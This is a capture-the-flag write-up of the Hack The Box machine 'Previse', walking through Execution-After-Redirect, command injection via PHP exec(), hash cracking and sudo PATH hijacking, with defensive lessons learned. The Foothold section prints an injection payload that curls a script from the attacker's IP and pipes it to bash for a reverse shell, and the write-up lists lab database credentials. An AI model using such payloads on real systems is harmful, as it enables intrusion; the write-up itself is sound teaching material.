# Previse

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.129.156.68 |
| **Status** | Retired |

## Overview
Previse is an Easy Linux machine running a custom PHP file-storage/logging application. The app suffers from an Execution-After-Redirect (EAR) flaw: pages that should require authentication (such as `accounts.php`) can still be requested and executed even though the server issues a redirect, because the redirect is not paired with an `exit()`/`die()`. This exposes an account-creation endpoint and a log-viewer that passes unsanitized input into PHP's `exec()`, leading to remote code execution as `www-data`. Privilege escalation involves cracking a custom salted MD5crypt hash and abusing a `sudo`-executable maintenance script with a relative-path binary that can be hijacked.

## Reconnaissance
Nmap showed SSH and an Apache/PHP application:

```
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)
| http-title: Previse Login
```

## Enumeration
The site presented a login page (`login.php`) backed by a "File Storage" application (`files.php`, `file_logs.php`, `logs.php`, `nav.php`, etc.: source retained in `files/`). Despite requiring authentication, `accounts.php` could still be reached directly and returned a functional account-registration form, due to the EAR bug: the script checks the session and issues a redirect header, but continues executing the rest of the page regardless. This allowed registering a new user (`m4lwhere`) without ever being logged in.

Once authenticated as `m4lwhere`, `logs.php` exposed a `delim` parameter that was concatenated directly into a shell command executed via PHP's `exec()`.

## Foothold
The `delim` parameter allowed command chaining using `&`/`;` style separators. A payload that downloaded and executed a reverse-shell script achieved code execution as `www-data`:

```
delim=comma%26curl+10.10.14.240%3a8000/rev.sh+|+bash
```

`rev.sh` was served from a local HTTP listener and, once fetched, opened a reverse shell back to the attacker. Reviewing `config.php` on the box confirmed hard-coded MySQL credentials used by the app:

```php
$host = 'localhost';
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
$db = 'previse';
```

## Privilege Escalation
The `previse` database's `accounts` table contained a custom salted MD5crypt-style hash for the user `m4lwhere`:

```
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
```

After normalizing the unicode salt (`🧂`), the hash was cracked offline to recover `m4lwhere`'s SSH password, giving direct SSH access. Once logged in, `sudo -l` showed the user could run a maintenance/backup script as root. That script invoked a helper binary without an absolute path, allowing a malicious binary placed earlier in `$PATH` to be executed with root privileges, giving a full root shell.

## Lessons Learned
- Execution-After-Redirect is a subtle but serious flaw: an HTTP redirect header alone does not stop PHP script execution unless followed by `exit`/`die`.
- Never pass user-controlled input into `exec()`/`system()` without strict allow-listing or escaping.
- Scripts executed via `sudo` must always reference dependent binaries by absolute path to avoid `$PATH`-hijacking privilege escalation.

## Tools & References
- Custom PHP application source (kept under `files/`), Hashcat/John the Ripper (MD5crypt cracking), netcat
- Omitted from repository for hygiene:
  - `Files/siteBackup.zip`: a small zip backup of the site source; its relevant PHP files are already preserved individually under `files/`.
  - The stray zero-byte file named `'` found alongside the leaked source was a scratch/artifact file and was removed.
